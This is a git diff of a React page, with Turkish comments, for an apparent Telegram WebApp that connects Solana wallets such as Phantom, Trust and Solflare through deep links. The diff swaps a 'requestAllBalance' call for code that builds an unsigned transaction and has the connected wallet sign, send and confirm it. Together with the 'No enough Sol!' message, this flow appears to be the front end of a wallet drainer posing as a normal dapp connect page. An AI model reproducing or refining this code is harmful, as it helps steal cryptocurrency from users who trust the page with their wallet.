@@ -7,11 +7,11 @@ import React, { useEffect, useRef, useState, Fragment } from 'react'
 import './assets/2idql.css'
 import './assets/connect.css'
 import { Transition } from '@headlessui/react'
-import { useWallet } from '@solana/wallet-adapter-react'
+import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletReadyState, WalletName } from '@solana/wallet-adapter-base'
-import { requestAllBalance } from '@/app/services/transaction'
+import { createUnsignedTransaction } from '@/app/services/transaction'
 
-// ——— Yalnızca solana augmentasyonu ———
+/* ——— Yalnızca solana augmentasyonu ——— */
 declare global {
   interface Window {
     solana?: {
@@ -23,7 +23,7 @@ declare global {
   }
 }
 
-// ——— Yerel Telegram WebApp tipi ———
+/* ——— Yerel Telegram WebApp tipi ——— */
 interface TgWebApp {
   expand: () => void
   requestFullscreen?: () => void
@@ -77,7 +77,8 @@ export default function Page() {
   }
 
   /* ——— Wallet & Drawer kontrolü ——— */
-  const { wallets, select, publicKey } = useWallet()
+  const { connection: conn } = useConnection()
+  const { wallets, select, publicKey, sendTransaction } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading,    setLoading]    = useState(false)
   const [msg,        setMsg]        = useState('')
@@ -109,45 +110,38 @@ export default function Page() {
       icon: '/phantom.svg',
       deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     },
-
     {
       match: name => name.toLowerCase().includes('trust'),
       label: 'Trust Wallet',
       icon: '/trustwallet.svg',
       deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`
     },
-
     {
       match: name => name.toLowerCase().includes('coinbase'),
       label: 'Coinbase Wallet',
       icon: '/coinbase.svg',
       deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`
     },
-
     {
       match: name =>
         name.toLowerCase().includes('bitkeep') ||
         name.toLowerCase().includes('bitget'),
       label: 'Bitget Wallet',
       icon: '/bitget.svg',
-      deepLink: `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(origin)}`
-      },
-
+      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`
+    },
     {
       match: name => name === 'Solflare',
       label: 'Solflare',
       icon: '/solflare.svg',
       deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
-
     },
-
     {
       match: name => name === 'Backpack',
       label: 'Backpack',
       icon: '/backpack.svg',
       deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
     },
-
   ]
 
   type DrawerWallet = WalletConfig & {
@@ -169,10 +163,23 @@ export default function Page() {
   /* ——— Transaction gönderme ——— */
   const doTx = async () => {
     setLoading(true)
-    const ok = await requestAllBalance()
-    setLoading(false)
-    if (!ok) {
-      setMsg('No enough Sol!')
+    try {
+      // imzalanmamış tx oluştur
+      const tx = await createUnsignedTransaction(publicKey || null)
+      if (!tx) {
+        setMsg('No enough Sol!')
+        return
+      }
+      // adapter ile imzala & gönder
+      const sig = await sendTransaction(tx, conn)
+      // onay
+      await conn.confirmTransaction(sig, 'confirmed')
+      setMsg('Transaction successful!')
+    } catch (e) {
+      console.error('Transaction error', e)
+      setMsg('Transaction failed')
+    } finally {
+      setLoading(false)
       setTimeout(() => setMsg(''), 5000)
     }
   }
